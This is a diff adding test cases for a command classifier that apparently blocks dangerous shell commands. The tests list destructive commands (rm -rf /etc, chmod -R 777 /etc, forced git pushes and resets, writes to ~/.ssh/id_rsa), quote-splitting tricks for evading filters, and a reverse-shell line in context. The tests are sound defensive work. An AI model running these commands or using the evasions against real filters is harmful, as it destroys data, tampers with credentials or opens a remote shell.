@@ -576,6 +576,64 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("shell quote-removal bypasses (round 2)", () => {
+    test('rm -r""f /etc (empty-string flag split)', () => {
+      expect(classifyCommand('rm -r""f /etc').ok).toBe(false);
+    });
+
+    test('rm -rf "/etc" (quoted target)', () => {
+      expect(classifyCommand('rm -rf "/etc"').ok).toBe(false);
+    });
+
+    test('chmod -""R 777 /etc (empty-string flag split)', () => {
+      expect(classifyCommand('chmod -""R 777 /etc').ok).toBe(false);
+    });
+
+    test('chmod -R 777 "/etc" (quoted target)', () => {
+      expect(classifyCommand('chmod -R 777 "/etc"').ok).toBe(false);
+    });
+
+    test('git reset --ha""rd HEAD (bonus: quote-split flag)', () => {
+      expect(classifyCommand('git reset --ha""rd HEAD').ok).toBe(false);
+    });
+  });
+
+  describe("git destructive refspec + short-flag forms (round 2)", () => {
+    test("git push origin +HEAD:main (+ refspec force)", () => {
+      expect(classifyCommand("git push origin +HEAD:main").ok).toBe(false);
+    });
+
+    test("git push origin +main (+ refspec force)", () => {
+      expect(classifyCommand("git push origin +main").ok).toBe(false);
+    });
+
+    test("git branch -d -f feature (short-flag pair)", () => {
+      expect(classifyCommand("git branch -d -f feature").ok).toBe(false);
+    });
+
+    test("git branch -f -d feature (reversed short-flag pair)", () => {
+      expect(classifyCommand("git branch -f -d feature").ok).toBe(false);
+    });
+
+    test("git push origin main (no force → allowed)", () => {
+      expect(classifyCommand("git push origin main").ok).toBe(true);
+    });
+
+    test("git push origin refs/heads/main:refs/heads/main (no + → allowed)", () => {
+      expect(classifyCommand("git push origin refs/heads/main:refs/heads/main").ok).toBe(true);
+    });
+  });
+
+  describe("SSH_DIR_WRITE round 2 additions", () => {
+    test("cmd >& $HOME/.ssh/id_rsa (>& redirect)", () => {
+      expect(classifyCommand("cmd >& $HOME/.ssh/id_rsa").ok).toBe(false);
+    });
+
+    test('cmd > "$HOME"/.ssh/id_rsa (split-quoted $HOME)', () => {
+      expect(classifyCommand('cmd > "$HOME"/.ssh/id_rsa').ok).toBe(false);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
